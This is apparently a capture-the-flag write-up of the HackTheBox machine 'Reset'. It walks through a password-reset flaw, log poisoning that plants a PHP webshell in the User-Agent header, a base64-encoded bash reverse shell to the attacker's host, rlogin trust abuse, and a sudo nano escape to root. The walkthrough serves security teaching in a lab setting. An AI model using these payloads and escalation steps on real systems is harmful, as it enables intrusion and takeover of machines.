---
maquina: "Reset"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "15 Jul 2025"
retire: "15 Jul 2025"
creadores: "xct"
htb_url: "https://hackthebox.com/machines/reset"
app_url: "https://app.hackthebox.com/machines/680"
url: "https://0xdf.gitlab.io/2025/07/15/htb-reset.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Reset has a website where the reset password API sends the new password back in the response to the request, by passing the need to have access to the account email. I’ll exploit a log poisoning vulnerability to get RCE. From there, I’ll abuse Berkeley r commands to get access as the next user, and find a password in a running tmux session. For root, I’ll abuse sudo nano. In Beyond Root, I’ll look at the web source and what the rlogin command looks like on the wire.

## Recon

### Initial Scanning

`nmap` finds five open TCP ports, SSH (22), HTTP (80), and unknown services on 512-514:

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.129.234.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 20:24 UTC
Nmap scan report for 10.129.234.130
Host is up (0.092s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
512/tcp open  exec
513/tcp open  login
514/tcp open  shell

Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
oxdf@hacky$ nmap -p 22,80,512-514 -sCV 10.129.234.130
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-03 20:25 UTC
Nmap scan report for 10.129.234.130
Host is up (0.090s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 6a:16:1f:c8:fe:fd:e3:98:a6:85:cf:fe:7b:0e:60:aa (ECDSA)
|_  256 e4:08:cc:5f:8e:56:25:8f:38:c3:ec:df:b8:86:0c:69 (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Admin Login
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
512/tcp open  exec    netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell   Netkit rshd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.39 seconds
```

Based on the [OpenSSH and Apache](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy LTS (but could also be 22.10 kenetic).

TCP 512-514 are related to the [Berkeley r-commands](https://en.wikipedia.org/wiki/Berkeley_r-commands). There’s nothing to really do with these now, but I’ll come back to them later.

### Website - TCP 80

#### Site

The site just presents a page for an admin login:

![image-20250603163112969](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603163112969.png)

Simple guesses like admin/admin don’t work, and as far as I can tell, there’s no different error message for invalid user and wrong password (though with just this, it’s always possible I just didn’t guess any valid usernames):

![image-20250603163137733](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603163137733.png)

The “Forgot Password?” link loads an overlay:

![image-20250603163257727](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603163257727.png)

Entering 0xdf shows the user doesn’t exist:

![image-20250603163313702](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603163313702.png)

However when I try admin, it works:

![image-20250603163330847](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603163330847.png)

This allows me to enumerate users, but not much else I can do without finding a way to access the link/token/information that was presumably sent to the user via email.

#### Tech Stack

The response headers from the initial GET request to `/` show that the site sets a `PHPSESSID` cookie, so the is almost certainly running PHP:

```http
HTTP/1.1 200 OK
Date: Tue, 03 Jun 2025 20:45:57 GMT
Server: Apache/2.4.52 (Ubuntu)
Set-Cookie: PHPSESSID=h72dhq82diroa26qcbdjqip5e9; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 4125
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

The login form loads as `/index.php` as well.

The 404 page is the [default Apache 404](https://0xdf.gitlab.io/cheatsheets/404#apache--httpd):

![image-20250603163537587](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603163537587.png)

The only two pages in my Burp history are `/` and `/reset_password.php`, which is where the POST request is sent when I try to reset.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```console
oxdf@hacky$ feroxbuster -u http://10.129.234.130 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.130
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       85l      213w     4125c http://10.129.234.130/index.php
200      GET        1l        2w       27c http://10.129.234.130/reset_password.php
200      GET       85l      213w     4125c http://10.129.234.130/
302      GET        0l        0w        0c http://10.129.234.130/dashboard.php => index.php
[####################] - 2m     30001/30001   0s      found:4       errors:1
[####################] - 2m     30000/30000   268/s   http://10.129.234.130/
```

The only new page is `/dashboard.php`, but it’s redirecting to `index.php` almost certainly because the brute force is not authenticated.

#### Request Analysis

When I reset a password, there’s a POST request to `/reset_password.php`:

![image-20250603164615605](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603164615605.png)

If the user doesn’t exist, it returns an error:

![image-20250603164630778](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603164630778.png)

However, if the user does exist, it returns extra information:

![image-20250603164702711](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603164702711.png)

The new password is in there! And it works to login. Taking a slight tangent, I can look at the JavaScript that makes this POST request in the page:

```html
<script>
    $('#resetPasswordForm').on('submit', function(e) {
        e.preventDefault();
        const username = $('#resetUsername').val();
        $.ajax({
            url: 'reset_password.php',
            method: 'POST',
            data: { username: username },
            success: function(data) {
                $('#resetMessage').removeClass('alert-danger alert-success').show();
                if (data.error) {
                    $('#resetMessage').addClass('alert-danger').text(data.error);
                } else {
                    $('#resetMessage').addClass('alert-success').html(`
                        Password reset successful!<br>
                        Timestamp: ${data.timestamp}
                    `);
                }
            },
            error: function() {
                $('#resetMessage').removeClass('alert-success').addClass('alert-danger').text('An error occurred while resetting the password.');
            }
        });
    });
</script>
```

When the response is success, it just takes the timestamp, ignoring the password.

### Authenticated Site

#### Dashboard

On logging in, I’m presented with a simple dash board with a capability to load log files:

![image-20250603164829814](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603164829814.png)

The dropdown menu offers `syslog` and `auth.log`. Clicking “View Logs” returns the logs:

![image-20250603170519710](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603170519710.png)

`auth.log` is empty, and even trying failed SSH logins doesn’t populate it.

#### POST Requests

On clicking “View Logs”, a POST request is sent to Reset:

```http
POST /dashboard.php HTTP/1.1
Host: 10.129.234.130
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://10.129.234.130
Connection: keep-alive
Referer: http://10.129.234.130/dashboard.php
Cookie: PHPSESSID=fa847n0ah4r3ea7gthb98ia0a6
Upgrade-Insecure-Requests: 1
Priority: u=0, i

file=%2Fvar%2Flog%2Fsyslog
```

The full path of the file is the parameter.

## Shell as www-data

### Directory Traversal / File Read [Fail]

My first thought is to try to change that path to something else, like `/etc/passwd`:

![image-20250603171638230](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603171638230.png)

It fails. I can try using a relative path in case it’s checking the start of the path, but it still fails:

![image-20250603171603686](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603171603686.png)

I’ll try other things like `/var/www/html/index.php`, but it does the same. I am able to read other logs, such as the Apache logs:

![image-20250603171759885](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603171759885.png)

### Command Injection [Fail]

It is possible that the page is using some kind of OS call to fetch the file. I’ll try some simple command injection payloads, such as:

```plaintext
file=%2Fvar%2Flog%2fauth.log%3bid%3b
```

This is appending `;id;` to the end, so if the string were being passed to the OS for execution, it might inject the `id` command. I don’t see any results other than “Invalid file path”. I’ll try some other injections (like backticks, `&`, `|`, and `$()`), and try some other commands (like pinging my host), but none work.

### Log Poisoning

#### Strategy

I’ve already seen that I can get my `User-Agent` header into the `access.log` file. It’s possible that the PHP script is using `include` rather than `file_get_contents` to put the file contents into the page. If that were the case, then I could put some PHP into the `access.log` and then execute it.

#### POC

I’ll make a request with a simple PHP command in the `User-Agent`:

```http
POST /dashboard.php HTTP/1.1
Host: 10.129.234.130
User-Agent: 0xdf <?php system('id'); ?>
Content-Type: application/x-www-form-urlencoded
Referer: http://10.129.234.130/dashboard.php
Cookie: PHPSESSID=e8km0mt0nl6tm1om9dhgd0st1j
Content-Length: 26

file=%2Fvar%2Flog%2fsyslog
```

Now I’ll use the page to load `/var/log/apache2/access.log`:

![image-20250603173306626](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603173306626.png)

That’s RCE via log poisoning.

#### Shell

I’ll repoison with a simple webshell:

```http
GET /dashboard.php HTTP/1.1
Host: 10.129.234.130
User-Agent: 0xdf: <?php system($_REQUEST['cmd']); ?>
Referer: http://10.129.234.130/index.php
Connection: keep-alive
Cookie: PHPSESSID=e8km0mt0nl6tm1om9dhgd0st1j
```

How I’ll load the poisoned log and add a `cmd` parameter:

![image-20250603174249815](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250603174249815.png)

I had a tricky time getting a straight [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to work, so I base64 encoded it:

```console
oxdf@hacky$ echo 'bash  -c "bash -i >& /dev/tcp/10.10.14.79/443   0>&1"' | base64
YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzkvNDQzICAgMD4mMSIK
```

And passed that:

```plaintext
file=%2Fvar%2Flog%2Fapache2%2faccess.log&cmd=echo+YmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzkvNDQzICAgMD4mMSIK|base64+-d|bash
```

I get a shell at `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.234.130 38646
bash: cannot set terminal process group (1080): Inappropriate ioctl for device
bash: no job control in this shell
www-data@reset:/var/www/html$
```

I’ll upgrade my shell using [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@reset:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@reset:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@reset:/var/www/html$
```

And read the user flag from `/home/sadm`:

```console
www-data@reset:/home/sadm$ cat user.txt
19ba954c************************
```

## Shell as radm

### Enumeration

#### Web

The only webserver in `/var/www` is `html`, which has the page:

```console
www-data@reset:/var/www/html$ ls
dashboard.php  index.php  private_34eee5d2  reset_password.php
```

I’ll look at `dashboard.php` in Beyond Root to see why the directory traversal failed and the poisoning worked, but there’s nothing there to move forward.

The `private_34eee5d2` directory has a SQLite db, which just has the admin’s hash:

```console
www-data@reset:/var/www/html$ sqlite3 private_34eee5d2/db.sqlite .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    is_admin INTEGER DEFAULT 0
);
INSERT INTO users VALUES(1,'admin','cca326e770bc57b4ab361962cba9a1427f895248',1);
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',1);
COMMIT;
```

It cracks to what I last reset it to.

#### Users

There are two users with home directories in `/home`:

```console
www-data@reset:/home$ ls
local  sadm
```

www-data can’t enter or list `local`. The list of uses is consistent with the users who have shells set (plus root):

```console
www-data@reset:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
local:x:1000:1000:local:/home/local:/bin/bash
sadm:x:1001:1001:,,,:/home/sadm:/bin/bash
```

As www-data, I can read `sadm`:

```console
www-data@reset:/home/sadm$ ls -la
total 36
drwxr-xr-x 4 sadm sadm 4096 Jun  4 14:57 .
drwxr-xr-x 4 root root 4096 Jun  2 11:34 ..
lrwxrwxrwx 1 sadm sadm    9 Dec  6 13:12 .bash_history -> /dev/null
-rw-r--r-- 1 sadm sadm  220 Dec  6 13:02 .bash_logout
-rw-r--r-- 1 sadm sadm 3771 Dec  6 13:02 .bashrc
drwx------ 2 sadm sadm 4096 Jun  2 11:34 .cache
drwxrwxr-x 3 sadm sadm 4096 Jun  2 11:34 .local
-rw-r--r-- 1 sadm sadm  807 Dec  6 13:02 .profile
-rw------- 1 sadm sadm    7 Dec  6 15:49 .rhosts
-rw-r--r-- 1 root root   33 Apr 10 09:45 user.txt
```

`.rhosts` is interesting, but I can’t read it yet. I’ll come back to that.

#### Processes

Looking at the running processes, I’ll note an interesting one running as sadm:

```console
www-data@reset:/$ ps auxww | grep sadm
sadm        1104  0.0  0.1   8764  3880 ?        Ss   Jun03   0:00 tmux new-session -d -s sadm_session
sadm        1111  0.0  0.2   8676  5452 pts/3    Ss+  Jun03   0:00 -bash
sadm       11267  0.0  0.4  17096  9432 ?        Ss   11:03   0:00 /lib/systemd/systemd --user
sadm       11268  0.0  0.1 169396  4008 ?        S    11:03   0:00 (sd-pam)
sadm       11274  0.0  0.2   8812  5616 pts/1    S+   11:03   0:00 -bash
```

There is a `tmux` session running as sadm. I’ll note this for later.

#### r-commands

`rlogin` is configured in the `/etc/hosts.equiv` file, which is present on Reset:

```console
www-data@reset:/$ cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
- root
- local
+ sadm
```

This says that root and local cannot login, but sadm can.

The [security section](https://en.wikipedia.org/wiki/Berkeley_r-commands#Security) of the r-commands page talks about major issues:

> Those r-commands which involve user authentication (`rcp`, `rexec`, `rlogin`, and `rsh`) share several serious security vulnerabilities:  All information, including passwords, is transmitted unencrypted (making it vulnerable to interception). The `.rlogin` (or `.rhosts`) file is easy to misuse. They are designed to allow logins without a [password](https://en.wikipedia.org/wiki/Password), but their reliance on remote usernames, hostnames, and IP addresses is exploitable. For this reason many corporate system administrators prohibit `.rhosts` files, and actively scrutinize their networks for offenders. The protocol partly relies on the remote party’s `rlogin` client to provide information honestly, including source port and source host name. A malicious client can forge this and gain access, as the `rlogin` protocol has no means of [authenticating](https://en.wikipedia.org/wiki/Authentication) the client is running on a trusted machine. It also cannot check if the requesting client on a trusted machine is the real `rlogin` client, meaning that malicious programs may pretend to be a standard-conforming `rlogin` client by using the same protocols. The common practice of mounting users’ home directories via [Network File System](https://en.wikipedia.org/wiki/Network_File_System) exposes rlogin to attack by means of fake `.rhosts` files - this means that any of its security faults automatically plague `rlogin`.

Authentication relies on the remote name, which can be faked.

### rlogin

To connect with `rlogin`, I’ll install the r-command clients with `pt install rsh-redone-client`. The clients require a password *unless* I’m trying to connect as a user with the same name as on my local system. I’ll look at the protocol a bit in Beyond Root.

To proceed with Reset, on my local system I’ll create a user name radm and set a password:

```console
oxdf@hacky$ sudo useradd sadm
oxdf@hacky$ sudo passwd sadm
New password:
Retype new password:
passwd: password updated successfully
```

Now I can switch to that user, and login without a password and it looks just like SSH:

```console
oxdf@hacky$ sudo su - sadm
su: warning: cannot change directory to /home/sadm: No such file or directory
$ rlogin 10.129.234.130
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-140-generic x86_64)
...[snip]...
sadm@reset:~$
```

### Recover Password

I noted above there was a `tmux` session running as radm. Tmux is a tool that allows for making multiple windows and splitting windows within a single terminal session. It’s a fantastic tool, and one I use in literally in every terminal session I open. It also allows a user to disconnect and reconnect, picking up in the same place they left off. In a job I had many years ago, the majority of my work was done by SSHing into a remote server. I would have a `tmux` session running so when I came back, all my terminals were just where I left them.

With a shell as radm, I can see this session:

```console
sadm@reset:~$ tmux ls
sadm_session: 1 windows (created Tue Jun  3 21:54:33 2025)
```

I can attach to this session with `tmux a -t <session name>`, so `tmux a -t sadm_session`:

![image-20250604065739849](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604065739849.png)

The green bar at the bottom is `tmux`. I actually have two nested `tmux` sessions going. The top bar is the session on Reset. The bottom bar is on my host. I have three windows currently on my session, and there’s just one on Reset. By default, the key to interact with `tmux` is Ctrl-a, but I typically remap mine to Ctrl-b, which works out well here as Ctrl-a will allow me to control the remote session and Ctrl-b mine.

Continuing on the box, there’s the password for sadm, “7lE2PAfVHfjz4HpE”.

## Shell as root

### Enumeration

sadm can run three commands as any user on Reset:

```console
sadm@reset:~$ sudo -l
Matching Defaults entries for sadm on reset:
    env_reset, timestamp_timeout=-1, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !syslog

User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

### nano Escape

`nano` has the ability to run shell commands. I’ll use `sudo` to open `/etc/firewall.sh` as root, `sudo nano /etc/firewall.sh`, which results in:

![image-20250604070156752](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604070156752.png)

Ctrl-r will open the read file menu:

![image-20250604070256719](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604070256719.png)

From there, Ctrl-x will open the “Execute Command” prompt:

![image-20250604070327448](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604070327448.png)

I can try just running `bash`, but it breaks terminal. I need to run `reset; bash 1>&0 2>&0`. This will reset the terminal (removing all that `nano` did to make it an application instead of working line to line) and then run `bash`. The file descriptor redirections seem a bit confusing, as it looks like both stdout and stderr are being redirected to stdin. What’s happening here is that stdin is almost certainly the terminal, and so this is saying to have both stdout and stderr output to that terminal device.

After running, the terminal is still a bit messed up, but there’s a root shell:

![image-20250604070931881](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604070931881.png)

I’ll run `reset` again and it makes a clear terminal.

From here I can read `root.txt`:

```console
root@reset:~# cat root_279e22f8.txt
7ad6951bcb5a2edaffd7908b013d29b0
```

## Beyond Root

### Web Application Source

`dashboard.php` has code at the top. First, there’s a check that it’s the admin user, or else it redirects to `index.php`:

```php
<?php
session_start();

if (!isset($_SESSION['admin'])) {
    header('Location: index.php');
    exit;
}
```

Next comes the check that prevented directory traversal:

```php
define('ALLOWED_BASE_DIR', '/var/log');
function isValidFile($filePath) {
    $realPath = realpath($filePath);
    return $realPath && strpos($realPath, ALLOWED_BASE_DIR) === 0;
}
```

The `isValidFile` [function](https://www.php.net/manual/en/function.realpath.php) uses `readpath` to resolve any `../` or `./` or extra `/` characters. Then it checks if the result starts with `/var/log`. So anything outside of `/var/log` will return false here.

Next, it reads from the file:

```php
$logs = [];
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $file = $_POST['file'];
    if (isValidFile($file)) {
        if (is_readable($file)) {
            ob_start();
            include($file);
            $logs = explode("\n", ob_get_clean());
        } else {
            $logs = ["Cannot read $file"];
        }
    } else {
        http_response_code(400);
        $logs = ["Invalid file path"];
    }
}
?>
```

It makes sure that the file is valid (starts with `/var/log`) and `is_readable` (which blocks any command injections). Then it passes the file to `include`, which is the vulnerability here. If it used `file_get_contents`, this would be nearly impossible to exploit.

### rlogin Protocol

#### RFC

BSD Rlogin is defined in [RFC-1282](https://datatracker.ietf.org/doc/html/rfc1282) (from 1991!). For connection establishment, the client sends:

```plaintext
        <null>
        client-user-name<null>
        server-user-name<null>
        terminal-type/speed<null>
```

It gives the example:

```plaintext
        <null>
        bostic<null>
        kbostic<null>
        vt100/9600<null>
```

The server responds with a null. Then the server sends 0x80, to request the windows size. The client’s response is as follows:

> `   The window change control sequence is 12 bytes in length, consisting
>    of a magic cookie (two consecutive bytes of hex FF), followed by two
>    bytes containing lower-case ASCII "s", then 8 bytes containing the
>    16-bit values for the number of character rows, the number of
>    characters per row, the number of pixels in the X direction, and the
>    number of pixels in the Y direction, in network byte order.  Thus:
>         FF FF s s rr cc xp yp`

#### WireShark

I’ll connect over Wireshark and see what’s exchanged on running `rlogin 10.129.234.130` as a user named sadm:

![image-20250604151802274](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604151802274.png)

The client sends the user name and terminal info. Then the server sends 0x00, then 0x80, to which the client responds with the window size frame. Then the server just sends the banners and a shell.

If I try as a different user, say with `sudo rlogin 10.129.234.130`, it shows root:root as the user and asks for a password:

![image-20250604152103617](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604152103617.png)

If I tell it to login as sadm, it sends the remote name as sadm, but still needs a password:

![image-20250604152208460](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250604152208460.png)

I wasn’t able to get rlogin to change the local user to sadm without creating a user and running as that user.
